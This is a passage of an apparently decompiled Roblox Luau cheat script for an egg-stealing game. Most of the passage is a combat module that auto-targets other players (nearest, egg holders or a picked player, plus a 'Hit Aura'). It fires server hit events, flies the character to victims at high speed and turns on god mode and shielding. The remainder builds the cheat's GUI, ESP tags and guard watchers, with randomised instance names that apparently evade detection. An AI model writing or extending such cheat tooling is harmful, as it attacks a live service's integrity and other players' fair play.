				CooldownBefore = n28,
				Tool = v19,
			})

			local str2 = string.format("%d:%d:%d", localPlayer.UserId, tbl27.Trace, math.floor(fn11() * 1000))

			pcall(function()
				v20:FireServer(arg, str2)
			end)

			return "Hitting " .. arg.DisplayName
		end

		combat.ReadyBat = function()
			local character = localPlayer.Character
			local v18 = combat.Humanoid(character)
			if not character or not v18 or v18.Health <= 0 then
				return false
			end
			local v19 = combat.PickBat(character)
			return v19 ~= nil and fn15(character, v18, v19)
		end

		combat.Swing = function()
			if tbl4.Steal.Active or tbl4.Steal.Carrying then
				return false
			end
			local lastFire = tbl27.LastFire
			local flag3 = os.clock() - lastFire < 0.3

			if not flag3 then
				flag3 = os.clock() - (tbl27.LastSwing or 0) < 0.15
			end

			if flag3 then
				return false
			end
			local character = localPlayer.Character
			local v18 = combat.Humanoid(character)
			if not character or not v18 or v18.Health <= 0 then
				return false
			end
			local v19 = combat.PickBat(character)
			if not v19 or not fn15(character, v18, v19) then
				return false
			end
			tbl27.LastSwing = os.clock()

			pcall(function()
				v19:Activate()
			end)

			return true
		end

		combat.HolderOf = function(arg)
			local v18 = workspace:FindFirstChild(arg)
			if not v18 then
				return nil
			end

			for _, descendant in ipairs(v18:GetDescendants()) do
				if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
					local ok, result, result2 = pcall(function()
						return descendant.Part0, descendant.Part1
					end)

					if ok then
						for _, v19 in ipairs({ result, result2 }) do
							if typeof(v19) == "Instance" and not v19:IsDescendantOf(v18) then
								local model = v19:FindFirstAncestorOfClass("Model")

								if model then
									model = Players:GetPlayerFromCharacter(model) or Players:FindFirstChild(model.Name)
								end

								local v20 = model or nil
								if v20 and v20 ~= localPlayer and v20:IsA("Player") then
									return v20
								end
							end
						end
					end
				end
			end

			return nil
		end

		task.spawn(function()
			while not tbl4.CombatDisposed do
				local holders = {}

				if tbl4.CombatWantsHolders then
					local eggState = tbl.EggState

					if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
						local ok, result = pcall(eggState.ReadFieldEggs)
						local records = ok and type(result) == "table" and result.Records or nil

						if type(records) == "table" then
							for _, record in pairs(records) do
								if type(record) == "table" and record.State == "Carried" and type(record.Uid) == "string" then
									local v18 = combat.HolderOf(record.Uid)

									if v18 then
										holders[v18] = true
									end
								end
							end
						end
					end
				end

				tbl27.Holders = holders
				task.wait(0.3)
			end
		end)

		combat.IsHolder = function(arg)
			return tbl27.Holders[arg] == true
		end

		local tbl30 = {}

		combat.OnNewLife = function(arg)
			table.insert(tbl30, arg)
		end

		local function fn25()
			table.clear(tbl27.Pending)
			tbl27.LastFire = 0
			tbl27.LastSwing = 0
			tbl27.EquipAt = 0
			table.clear(tbl27.Tracks)
			table.clear(tbl27.WallSide)
			tbl27.SpawnRagdoll = fn13(localPlayer)

			for _, v18 in ipairs(tbl30) do
				pcall(v18)
			end
		end

		local characterAdded = localPlayer.CharacterAdded
		local connect = characterAdded.Connect
		local tbl31 = { localPlayer.CharacterRemoving:Connect(fn25), connect(characterAdded, fn25) }

		fn4(function()
			tbl4.CombatDisposed = true

			for _, v18 in ipairs(tbl31) do
				pcall(function()
					v18:Disconnect()
				end)
			end
		end)
	end

	local tbl28

	do
		local combat2 = tbl4.Combat
		local tbl29 = { "Nearest", "Egg Holders", "Specific Player" }
		local n18 = 0.7
		local str2 = "No other players"

		tbl28 = {
			Handles = {},
			AuraHandle = nil,
			Row = nil,
			Picker = nil,
			TargetMode = tbl29[1],
			Picked = nil,
			LabelToName = {},
			Speed = 400,
			MaxSpeed = 750,
			Target = nil,
			Plan = nil,
			Moving = false,
			Status = "Idle",
			Shown = nil,
			NamesDirty = true,
		}

		local function fn11()
			for i, v17 in ipairs(tbl29) do
				if tbl4.Toggle(tbl28.Handles[i], false) then
					return v17
				end
			end

			return nil
		end

		local function fn12()
			return tbl4.Toggle(tbl28.AuraHandle, false) == true
		end

		tbl4.CombatActive = function()
			return fn11() ~= nil or fn12()
		end

		local function fn13(arg)
			if not combat2.Hittable(arg) then
				return false
			end

			if tbl28.TargetMode == tbl29[2] then
				return combat2.IsHolder(arg)
			end

			if tbl28.TargetMode == tbl29[3] then
				return tbl28.Picked ~= nil and arg.Name == tbl28.Picked
			end
			return true
		end

		local function fn14(arg)
			local target = tbl28.Target
			local magnitude

			if target and fn13(target) then
				local v17, v18 = combat2.Parts(target)
				magnitude = (v18.Position - arg).Magnitude
			else
				target = nil
				magnitude = math.huge
			end

			local huge = math.huge
			local v17 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= target and fn13(player) and not combat2.Ragdolled(player) then
					local v18, v19 = combat2.Parts(player)
					local magnitude2 = (v19.Position - arg).Magnitude

					if magnitude2 < huge then
						huge = magnitude2
						v17 = player
					end
				end
			end

			if target then
				if v17 and not combat2.Ragdolled(target) and huge < magnitude * n18 then
					return v17
				end
				return target
			end

			return v17
		end

		local function fn15(arg, arg2)
			local v17 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local character = player.Character
					character = character and character:FindFirstChild("HumanoidRootPart")

					if character then
						local magnitude = (character.Position - arg).Magnitude

						if magnitude < arg2 and combat2.Hittable(player) and not combat2.Ragdolled(player) then
							arg2 = magnitude
							v17 = player
						end
					end
				end
			end

			return v17, arg2
		end

		local function fn16()
			tbl28.Plan = nil

			if tbl28.Moving then
				tbl28.Moving = false
				tbl4.EndFlight()
				tbl4.GodMode(false)
				tbl4.Shield("combat", false)
				combat2.ResetWalls()
			end

			tbl4.ReleaseMovement("combat")
		end

		combat2.OnNewLife(function()
			tbl28.AuraVictim = nil
			tbl28.Target = nil
			tbl28.Plan = nil
			pcall(fn16)
		end)

		local function fn17()
			local movement = tbl4.Movement
			return tbl4.Steal.Active or tbl4.Steal.Carrying or tbl4.Steal.Wanted and tbl4.Toggle(v5, false) or movement.Owner ~= nil and movement.Owner ~= "combat" and movement.Owner ~= "treadmill"
		end

		local function fn18(arg)
			local character = localPlayer.Character
			local n19 = combat2.Range(character and combat2.PickBat(character) or nil) + 6
			local v17, v18 = fn15(arg.Position, n19 + 24)

			if not v17 or v18 > n19 then
				tbl28.AuraVictim = nil

				if v17 then
					combat2.ReadyBat()
				end

				tbl28.Status = "Aura ready, nobody in reach"
				return
			end

			tbl28.AuraVictim = v17
			tbl28.Status = combat2.TryHit(v17, combat2.Plan(v17, arg, nil, true)) or "Aura on " .. v17.DisplayName
		end

		local function fn19()
			local v17 = fn11()

			if v17 and v17 ~= tbl28.TargetMode then
				tbl28.TargetMode = v17
				tbl28.Target = nil
			end

			tbl4.CombatWantsHolders = v17 == tbl29[2]
			local v18 = fn12()
			local flag3 = not v17

			if flag3 then
				if tbl28.Target or tbl28.Moving then
					tbl28.Target = nil
					fn16()
				end
			end

			if flag3 and not v18 then
				tbl28.Status = "Idle"
				return
			end
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local v19 = combat2.Humanoid(character)

			if not humanoidRootPart or not v19 or v19.Health <= 0 then
				tbl28.Target = nil
				fn16()
				tbl28.Status = "Waiting for your character"
				return
			end

			if flag3 then
				fn18(humanoidRootPart)
				return
			end
			local v20 = fn14(humanoidRootPart.Position)
			tbl28.Target = v20

			if not v20 then
				fn16()
				if v18 then
					fn18(humanoidRootPart)
					return
				end
				tbl28.Status = v17 == tbl29[2] and "Waiting for someone to hold an egg" or v17 == tbl29[3] and "Picked player is not reachable" or "No player to hit"
				return
			end

			local v21 = combat2.Plan(v20, humanoidRootPart)
			local flag4 = v17 ~= tbl29[2]

			if not fn17() and (flag4 or not combat2.SelfRagdolled()) and tbl4.ClaimMovement("combat") and not tbl4.AntiGuard.Busy then
				if not tbl28.Moving then
					tbl28.Moving = true
					tbl4.Shield("combat", true)
					tbl4.GodMode(true)
					tbl4.BeginFlight()
				end

				tbl4.GodTick()
				tbl28.Plan = v21
			else
				if tbl28.Moving then
					fn16()
				end

				tbl28.Plan = nil
			end

			local v22 = combat2.TryHit(v20, v21, flag4)
			local n19 = v21 and math.floor(v21.Distance + 0.5) or 0

			if v22 then
				tbl28.Status = v22 .. string.format("  %d studs", n19)
			elseif fn17() then
				tbl28.Status = string.format("Waiting for Auto Steal, near %s", v20.DisplayName)
			else
				tbl28.Status = string.format("Chasing %s  %d studs", v20.DisplayName, n19)
			end
		end

		local function fn20()
			local tbl30 = {}

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					table.insert(tbl30, player)
				end
			end

			table.sort(tbl30, function(arg, arg2)
				return string.lower(arg.DisplayName) < string.lower(arg2.DisplayName)
			end)

			local tbl31 = {}

			for _, v17 in ipairs(tbl30) do
				tbl31[v17.DisplayName] = (tbl31[v17.DisplayName] or 0) + 1
			end

			local tbl32 = {}
			local tbl33 = {}

			for _, v17 in ipairs(tbl30) do
				local displayName = v17.DisplayName

				if tbl31[displayName] > 1 then
					displayName = string.format("%s (@%s)", v17.DisplayName, v17.Name)
				end

				table.insert(tbl32, displayName)
				tbl33[displayName] = v17.Name
			end

			if #tbl32 == 0 then
				tbl32[1] = str2
			end

			return tbl32, tbl33
		end

		local function fn21(arg)
			for k, v17 in pairs(tbl28.LabelToName) do
				if v17 == arg then
					return k
				end
			end

			return nil
		end

		local connection = RunService.PreSimulation:Connect(function(deltaTime)
			local plan = tbl28.Plan
			if not plan or not tbl28.Moving then
				return
			end
			local v17 = tbl4.Root()

			if v17 then
				combat2.Steer(v17, plan, tbl28.Speed, math.max(tbl28.Speed, tbl28.MaxSpeed), deltaTime)
			end
		end)

		local n19 = 0.05
		local n20 = 0

		local connection2 = RunService.Heartbeat:Connect(function()
			local flag3 = fn11() ~= nil
			local v17 = fn12()

			if not v17 then
				tbl28.AuraVictim = nil
			end

			local now = os.clock()

			if flag3 or not v17 or now >= n20 then
				if v17 and not flag3 then
					n20 = now + n19
				end

				if not pcall(fn19) then
					tbl28.Status = "Retrying"
				end
			end

			if flag3 or v17 and tbl28.AuraVictim ~= nil then
				pcall(combat2.Swing)
			end

			local row = tbl28.Row

			if row and tbl28.Shown ~= tbl28.Status and type(row.Set) == "function" then
				tbl28.Shown = tbl28.Status
				pcall(row.Set, row, tbl28.Status)
			end

			local picker = tbl28.Picker

			if tbl28.NamesDirty and picker and type(picker.SetOptions) == "function" then
				tbl28.NamesDirty = false
				local v18, v19 = fn20()
				tbl28.LabelToName = v19
				pcall(picker.SetOptions, picker, v18, tbl28.Picked and fn21(tbl28.Picked) or v18[1], false)
			end
		end)

		local connection3 = Players.PlayerAdded:Connect(function()
			tbl28.NamesDirty = true
		end)

		local connection4 = Players.PlayerRemoving:Connect(function(player)
			tbl28.NamesDirty = true

			if tbl28.Target == player then
				tbl28.Target = nil
			end
		end)

		fn4(function()
			for _, v17 in ipairs({ connection, connection2, connection3, connection4 }) do
				pcall(function()
					v17:Disconnect()
				end)
			end

			tbl28.Target = nil
			fn16()
		end)

		local function fn22(arg, arg2)
			if tbl4.Toggle(arg, false) and tbl4.Toggle(tbl4.InvisibilityHandle, false) then
				tbl4.UiDefer(function()
					pcall(arg.Set, arg, false, false)
					tbl4.Notify(arg2, "Turn off Invisibility first, both cannot be on at the same time")
				end)

				return true
			end

			return false
		end

		tbl28.Row = v15:CreateText({ Name = "Hit Status", Text = "Idle" })
		local v17 = v2:CreateExclusiveGroup({ Name = "Chilli Combat Targets", MaxActive = 1 })

		for i, v18 in ipairs({ "Auto Hit Nearest Player", "Auto Hit Egg Holders", "Auto Hit Specific Player" }) do
			local v19 = nil

			v19 = v15:CreateToggle({
				Name = v18,
				Default = false,
				Callback = function()
					fn22(v19, v18)
				end,
			})

			pcall(v19.JoinExclusiveGroup, v19, v17)
			tbl28.Handles[i] = v19
		end

		local v18, v19 = fn20()
		tbl28.LabelToName = v19

		tbl28.Picker = v15:CreateDropdown({
			Name = "Hit Player",
			Options = v18,
			Default = v18[1],
			SubOf = tbl28.Handles[3],
			Callback = function(arg)
				tbl28.Picked = tbl28.LabelToName[tostring(arg)]
				tbl28.Target = nil
			end,
		})

		tbl28.AuraHandle = v15:CreateToggle({
			Name = "Hit Aura",
			Default = false,
			Callback = function()
				fn22(tbl28.AuraHandle, "Hit Aura")
			end,
		})

		pcall(tbl28.AuraHandle.JoinExclusiveGroup, tbl28.AuraHandle, v17)
		local v20 = v15:CreateLabel({ Name = "Chase Settings", Text = "Chase Settings" })

		v15:CreateSlider({
			Name = "Hit Tween Speed",
			SubOf = v20,
			Min = 100,
			Max = 1000,
			Default = 400,
			Increment = 10,
			Unit = "studs/s",
			Callback = function(arg)
				tbl28.Speed = math.clamp(tonumber(arg) or 400, 100, 1000)
			end,
		})

		v15:CreateSlider({
			Name = "Hit Max Speed",
			SubOf = v20,
			Min = 100,
			Max = 1000,
			Default = 750,
			Increment = 10,
			Unit = "studs/s",
			Callback = function(arg)
				tbl28.MaxSpeed = math.clamp(tonumber(arg) or 750, 100, 1000)
			end,
		})

		v15:CreateSlider({
			Name = "Hit Lead",
			SubOf = v20,
			Note = "Stand further ahead of the target (+) or closer to them (-)",
			Min = -400,
			Max = 100,
			Default = -275,
			Increment = 1,
			Callback = function(arg)
				combat2.SetLead(arg)
			end,
		})

		v15:CreateSlider({
			Name = "Hit Sweep",
			SubOf = v20,
			Note = "How far you move back and forth in front of the target",
			Min = 0,
			Max = 250,
			Default = 60,
			Increment = 1,
			Unit = "%",
			Callback = function(arg)
				combat2.SetSweep(arg)
			end,
		})
	end

	do
		local n18 = 2
		local v17 = nil

		local function fn11()
			local getState = v2.GetState
			return v2:GetState("Quick Pinned Features"), getState(v2, "Quick Pin Groups")
		end

		local function fn12()
			local tbl29 = {}

			for _, v18 in ipairs({ tbl28.Handles[1], tbl28.Handles[2], tbl28.AuraHandle }) do
				local ok, result = pcall(function()
					return v18:GetQuickPath()
				end)

				if ok and type(result) == "string" then
					table.insert(tbl29, result)
				end
			end

			return tbl29
		end

		local function fn13()
			local v18, v19 = fn11()
			if not v18 or not v19 then
				return false
			end
			local v20 = v18:Get()
			local v21 = v19:Get()
			if type(v20) ~= "table" or type(v21) ~= "table" then
				return false
			end
			local v22 = fn12()
			if #v22 == 0 then
				return false
			end

			for _, v23 in ipairs(v22) do
				if not table.find(v20, v23) or tonumber(v21[v23]) ~= n18 then
					return false
				end
			end

			return true
		end

		local function fn14()
			if v17 and type(v17.SetActionText) == "function" then
				pcall(v17.SetActionText, v17, fn13() and "Remove" or "Add")
			end
		end

		local function fn15()
			local v18, v19 = fn11()
			if not v18 or not v19 then
				tbl4.Notify("Quick Bar", "The Quick Bar is not ready yet, try again in a moment")
				return
			end
			local v20 = fn13()
			local tbl29 = {}
			local tbl30 = {}
			local v21 = v18:Get()

			if type(v21) == "table" then
				for i, v22 in ipairs(v21) do
					tbl29[i] = v22
				end
			end

			local v22 = v19:Get()

			if type(v22) == "table" then
				for k, v23 in pairs(v22) do
					tbl30[k] = v23
				end
			end

			for _, v23 in ipairs(fn12()) do
				local v24 = table.find(tbl29, v23)

				if v20 then
					if v24 then
						table.remove(tbl29, v24)
					end

					tbl30[v23] = nil
				else
					tbl30[v23] = n18

					if not v24 then
						table.insert(tbl29, v23)
					end
				end
			end

			v19:Set(tbl30)
			v18:Set(tbl29)
			fn14()
			tbl4.Notify("Quick Bar", v20 and "Removed the hit toggles from Quick Bar 2" or "Added the hit toggles to Quick Bar 2")
		end

		v17 = v15:CreateButton({
			Name = "Add/Remove Hits On Quick Bar 2",
			Note = "Pin or unpin the hit toggles on Quick Bar 2",
			ButtonText = "Add",
			ConfirmText = "Done!",
			Callback = function()
				tbl4.UiDefer(fn15)
			end,
		})

		task.delay(3, function()
			tbl4.UiDefer(fn14)
		end)
	end

	espSection = tbl4.EspSection

	local function fn11(arg, arg2)
		local ok, result = pcall(Font.new, arg, arg2, Enum.FontStyle.Normal)
		return ok and result or nil
	end

	tbl6 = {
		MainFont = fn11("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
		StatusFont = fn11("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular),
		Sequence = function(arg)
			local v17 = table.create(#arg)

			for i, v18 in ipairs(arg) do
				v17[i] = ColorSequenceKeypoint.new(v18[1], v18[2])
			end

			return ColorSequence.new(v17)
		end,
	}

	local color
	color = Color3.fromRGB
	local sequence2
	sequence2 = tbl6.Sequence
	local palettes
	palettes = {}

	do
		local gold = {}
		local tbl29 = {}
		local tbl30 = { 0, color(255, 231, 158) }
		local tbl31 = { 0.4, color(255, 196, 66) }
		local tbl32 = { 1, color(214, 142, 12) }
		tbl29[1] = tbl30
		tbl29[2] = tbl31
		tbl29[3] = tbl32
		gold.Text = sequence2(tbl29)
		local tbl33 = {}
		local tbl34 = { 0, color(122, 76, 0) }
		local tbl35 = { 0.55, color(62, 38, 0) }
		local tbl36 = { 1, color(20, 12, 0) }
		tbl33[1] = tbl34
		tbl33[2] = tbl35
		tbl33[3] = tbl36
		gold.Stroke = sequence2(tbl33)
		gold.Outline = color(255, 232, 152)
		palettes.Gold = gold
	end

	do
		local orange = {}
		local tbl29 = {}
		local tbl30 = { 0, color(255, 198, 132) }
		local tbl31 = { 0.4, color(255, 146, 40) }
		local tbl32 = { 1, color(206, 92, 0) }
		tbl29[1] = tbl30
		tbl29[2] = tbl31
		tbl29[3] = tbl32
		orange.Text = sequence2(tbl29)
		local tbl33 = {}
		local tbl34 = { 0, color(112, 54, 0) }
		local tbl35 = { 0.55, color(56, 27, 0) }
		local tbl36 = { 1, color(18, 8, 0) }
		tbl33[1] = tbl34
		tbl33[2] = tbl35
		tbl33[3] = tbl36
		orange.Stroke = sequence2(tbl33)
		orange.Outline = color(255, 194, 112)
		palettes.Orange = orange
	end

	do
		local red = {}
		local tbl29 = {}
		local tbl30 = { 0, color(255, 105, 105) }
		local tbl31 = { 0.4, color(255, 28, 40) }
		local tbl32 = { 1, color(184, 0, 18) }
		tbl29[1] = tbl30
		tbl29[2] = tbl31
		tbl29[3] = tbl32
		red.Text = sequence2(tbl29)
		local tbl33 = {}
		local tbl34 = { 0, color(124, 0, 15) }
		local tbl35 = { 0.55, color(61, 0, 9) }
		local tbl36 = { 1, color(18, 0, 3) }
		tbl33[1] = tbl34
		tbl33[2] = tbl35
		tbl33[3] = tbl36
		red.Stroke = sequence2(tbl33)
		red.Outline = color(255, 128, 138)
		palettes.Red = red
	end

	do
		local accent = {}
		local tbl29 = {}
		local tbl30 = { 0, color(170, 255, 160) }
		local tbl31 = { 0.45, color(58, 255, 55) }
		local tbl32 = { 1, color(20, 109, 0) }
		tbl29[1] = tbl30
		tbl29[2] = tbl31
		tbl29[3] = tbl32
		accent.Text = sequence2(tbl29)
		local tbl33 = {}
		local tbl34 = { 0, color(10, 52, 6) }
		local tbl35 = { 1, color(3, 16, 0) }
		tbl33[1] = tbl34
		tbl33[2] = tbl35
		accent.Stroke = sequence2(tbl33)
		accent.Outline = color(58, 255, 55)
		palettes.Accent = accent
	end

	do
		local sheen = {}
		local tbl29 = {}
		local tbl30 = { 0, color(255, 255, 255) }
		local tbl31 = { 0.5, color(222, 222, 222) }
		local tbl32 = { 1, color(255, 255, 255) }
		tbl29[1] = tbl30
		tbl29[2] = tbl31
		tbl29[3] = tbl32
		sheen.Text = sequence2(tbl29)
		local tbl33 = {}
		local tbl34 = { 0, color(8, 8, 8) }
		local tbl35 = { 1, color(8, 8, 8) }
		tbl33[1] = tbl34
		tbl33[2] = tbl35
		sheen.Stroke = sequence2(tbl33)
		sheen.Outline = color(255, 255, 255)
		palettes.Sheen = sheen
	end

	tbl6.Palettes = palettes

	tbl6.PaletteFromColor = function(arg)
		local color2 = Color3.new(1, 1, 1)
		local color3 = Color3.new(0, 0, 0)
		local tbl29 = {}
		local sequence3 = tbl6.Sequence
		local tbl30 = {}
		local tbl31 = { 0, arg:Lerp(color2, 0.5) }
		local tbl32 = { 0.4, arg:Lerp(color2, 0.1) }
		local tbl33 = { 1, arg:Lerp(color3, 0.25) }
		tbl30[1] = tbl31
		tbl30[2] = tbl32
		tbl30[3] = tbl33
		tbl29.Text = sequence3(tbl30)
		local sequence4 = tbl6.Sequence
		local tbl34 = {}
		local tbl35 = { 0, arg:Lerp(color3, 0.55) }
		local tbl36 = { 0.55, arg:Lerp(color3, 0.75) }
		local tbl37 = { 1, arg:Lerp(color3, 0.92) }
		tbl34[1] = tbl35
		tbl34[2] = tbl36
		tbl34[3] = tbl37
		tbl29.Stroke = sequence4(tbl34)
		tbl29.Outline = arg:Lerp(color2, 0.25)
		return tbl29
	end

	tbl6.SizeScale = 1
	local tbl29 = {}

	tbl6.OnSizeChanged = function(arg)
		table.insert(tbl29, arg)
	end

	tbl6.SetSizeScale = function(sizeScale)
		if tbl6.SizeScale == sizeScale then
			return
		end
		tbl6.SizeScale = sizeScale

		for _, v17 in ipairs(tbl29) do
			pcall(v17)
		end
	end

	tbl6.RowHeight = function(arg)
		local currentCamera = workspace.CurrentCamera
		return math.max(6, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.014, 13, 19) * (arg or tbl6.SizeScale)))
	end

	tbl6.ScaledWidth = function(arg, arg2)
		return math.max(30, math.floor(arg * (arg2 or tbl6.SizeScale)))
	end

	tbl6.CreateRuntime = function()
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = fn3()
		screenGui.Archivable = false
		screenGui.ResetOnSpawn = false
		screenGui.IgnoreGuiInset = true
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.DisplayOrder = 48
		screenGui.Parent = v3
		return screenGui
	end

	tbl6.CreateTag = function(parent, maxDistance)
		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Name = fn3()
		billboardGui.AlwaysOnTop = true
		billboardGui.LightInfluence = 0
		billboardGui.MaxDistance = maxDistance
		local frame = Instance.new("Frame")
		frame.Name = fn3()
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Size = UDim2.fromScale(1, 1)
		frame.Parent = billboardGui
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.Name = fn3()
		uiListLayout.FillDirection = Enum.FillDirection.Vertical
		uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.Parent = frame
		billboardGui.Parent = parent
		return billboardGui, frame
	end

	tbl6.CreateTextRow = function(parent, fontFace, layoutOrder, arg)
		local frame = Instance.new("Frame")
		frame.Name = fn3()
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Size = UDim2.fromScale(1, arg)
		frame.LayoutOrder = layoutOrder
		frame.Parent = parent

		local function createTextLabel(zIndex)
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = fn3()
			textLabel.BackgroundTransparency = 1
			textLabel.Size = UDim2.fromScale(1, 1)
			textLabel.Text = ""
			textLabel.TextScaled = true
			textLabel.TextStrokeTransparency = 1
			textLabel.TextXAlignment = Enum.TextXAlignment.Center
			textLabel.TextYAlignment = Enum.TextYAlignment.Center
			textLabel.ZIndex = zIndex

			if fontFace then
				textLabel.FontFace = fontFace
			else
				textLabel.Font = Enum.Font.GothamBold
			end

			textLabel.Parent = frame
			return textLabel
		end

		local v17 = createTextLabel(2)
		v17.Position = UDim2.fromOffset(1, 1)
		v17.TextColor3 = Color3.new(0, 0, 0)
		v17.TextTransparency = 0.1
		local v18 = createTextLabel(3)
		v18.TextColor3 = Color3.new(1, 1, 1)
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Name = fn3()
		uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
		uiStroke.LineJoinMode = Enum.LineJoinMode.Round
		uiStroke.Color = Color3.new(1, 1, 1)
		uiStroke.Transparency = 0.05

		uiStroke.Thickness = pcall(function()
			uiStroke.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
		end) and 0.05 or 1.2

		uiStroke.Parent = v18
		local uiGradient = Instance.new("UIGradient")
		uiGradient.Name = fn3()
		uiGradient.Rotation = 90
		uiGradient.Parent = uiStroke
		local uiGradient2 = Instance.new("UIGradient")
		uiGradient2.Name = fn3()
		uiGradient2.Rotation = 90
		uiGradient2.Parent = v18
		return { Holder = frame, Shadow = v17, Label = v18, StrokeGradient = uiGradient, TextGradient = uiGradient2, Palette = nil }
	end

	tbl6.SetRow = function(arg, text, palette)
		if arg.Label.Text ~= text then
			arg.Label.Text = text
			arg.Shadow.Text = text
		end

		if arg.Palette ~= palette then
			arg.Palette = palette
			arg.TextGradient.Color = palette.Text
			arg.TextGradient.Rotation = palette.Rotation or 90
			arg.StrokeGradient.Color = palette.Stroke
		end
	end

	tbl6.ReadToggle = function(arg, arg2)
		if type(arg) ~= "table" then
			return arg2 == true
		end

		local ok, result = pcall(function()
			local controller = arg._controller
			return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
		end)

		if ok and type(result) == "boolean" then
			return result
		end

		for _, v17 in ipairs({ "Get", "GetValue" }) do
			local ok2, result2 = pcall(function()
				return arg[v17]
			end)

			if ok2 and type(result2) == "function" then
				local ok3, result3 = pcall(result2, arg)
				if ok3 and type(result3) == "boolean" then
					return result3
				end
			end
		end

		return arg2 == true
	end

	tbl6.SyncSoon = function(arg)
		arg()
		task.delay(0.35, arg)
	end

	tbl6.GetGuardAreas = function()
		local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
		world = world and world:FindFirstChild("Areas")
		return world and world:FindFirstChild("GuardAreas")
	end

	tbl6.FindGuardRoot = function(arg)
		local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
		if humanoidRootPart and humanoidRootPart:IsA("BasePart") then
			return humanoidRootPart
		end

		if arg.PrimaryPart then
			return arg.PrimaryPart
		end
		return arg:FindFirstChildWhichIsA("BasePart", true)
	end

	tbl6.WatchGuards = function(arg)
		local tbl30 = {}
		local v17 = tbl6.GetGuardAreas()
		if not v17 then
			return tbl30
		end

		local function fn12(child)
			local guard = child:FindFirstChild("Guard")

			if guard and guard:IsA("Model") then
				arg(child.Name, guard)
			end

			table.insert(tbl30, child.ChildAdded:Connect(function(child2)
				if child2.Name == "Guard" and child2:IsA("Model") then
					arg(child.Name, child2)
				end
			end))
		end

		for _, child in ipairs(v17:GetChildren()) do
			fn12(child)
		end

		table.insert(tbl30, v17.ChildAdded:Connect(fn12))
		return tbl30
	end

	tbl6.DisconnectAll = function(arg)
		for _, v17 in ipairs(arg) do
			pcall(function()
				v17:Disconnect()
			end)
		end

		table.clear(arg)
	end

	n = 18

	tbl7 = {
		"Icon",
		"Name",
		"Rarity",
		"Mutation",
		"Value",
		"Weight",
		"Size",
		"Sell Price",
		"Distance",
		"Area",
		"State",
	}

	tbl8 = { "Icon", "Name", "Value" }
	tbl9 = { "Off", "Rare Only", "All Shown" }
	tbl10 = { Icon = 3.2, Name = 1.35, Rarity = 1.2, Mutation = 1, Value = 1.1, Info = 1 }

	local function fn12()
		local ok, result = pcall(Font.new, "rbxassetid://12187365977", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
		return ok and result or tbl6.StatusFont
	end

	v6 = fn12()
	sequence = tbl6.Sequence
	tbl11 = {}

	do
		local tbl30 = { 0, Color3.fromRGB(255, 255, 255) }
		local tbl31 = { 0.2, Color3.fromRGB(206, 212, 224) }
		local tbl32 = { 0.42, Color3.fromRGB(74, 80, 94) }
		local tbl33 = { 0.58, Color3.fromRGB(42, 46, 56) }
		local tbl34 = { 0.78, Color3.fromRGB(158, 166, 182) }
		local tbl35 = { 1, Color3.fromRGB(250, 252, 255) }
		tbl11[1] = tbl30
		tbl11[2] = tbl31
		tbl11[3] = tbl32
		tbl11[4] = tbl33
		tbl11[5] = tbl34
		tbl11[6] = tbl35
	end
end

local v7, v8, v9, tbl12, paint, bold, color, n2, v10, tbl13
local tbl14, tbl15, tbl16, flag, n3, fn8, fn9, fn10, fn11, fn12
local fn13, fn14

do
	local n4, n5, n6, n7, n8, n9, n10, n11, n12, tweenInfo
	local tweenInfo2, tweenInfo3, tweenInfo4, tweenInfo5, TweenService, color2, fn15, tbl17, tbl18

	do
		local v11
		v11 = sequence(tbl11)
		local v12
		v12 = tbl6.PaletteFromColor(Color3.fromRGB(77, 255, 122))
		local tbl19
		tbl19 = {}

		do
			local sequence2 = tbl6.Sequence
			local tbl20 = {}
			local tbl21 = { 0, Color3.fromRGB(255, 255, 255) }
			local tbl22 = { 0.5, Color3.fromRGB(222, 238, 255) }
			local tbl23 = { 1, Color3.fromRGB(255, 255, 255) }
			tbl20[1] = tbl21
			tbl20[2] = tbl22
			tbl20[3] = tbl23
			tbl19.Text = sequence2(tbl20)
		end

		do
			local sequence2 = tbl6.Sequence
			local tbl20 = {}
			local tbl21 = { 0, Color3.fromRGB(8, 8, 8) }
			local tbl22 = { 1, Color3.fromRGB(8, 8, 8) }
			tbl20[1] = tbl21
			tbl20[2] = tbl22
			tbl19.Stroke = sequence2(tbl20)
		end

		tbl19.Outline = Color3.fromRGB(255, 255, 255)
		local n13
		n13 = 0.8
		local n14
		n14 = 4.5
		local n15
		n15 = 20
		local n16
		n16 = 0.002
		local tbl20
		tbl20 = { Golden = tbl6.Palettes.Gold }

		do
			local silver = {}
			local sequence2 = tbl6.Sequence
			local tbl21 = {}
			local tbl22 = { 0, Color3.fromRGB(255, 255, 255) }
			local tbl23 = { 0.45, Color3.fromRGB(214, 222, 232) }
			local tbl24 = { 1, Color3.fromRGB(150, 160, 175) }
			tbl21[1] = tbl22
			tbl21[2] = tbl23
			tbl21[3] = tbl24
			silver.Text = sequence2(tbl21)
			local sequence3 = tbl6.Sequence
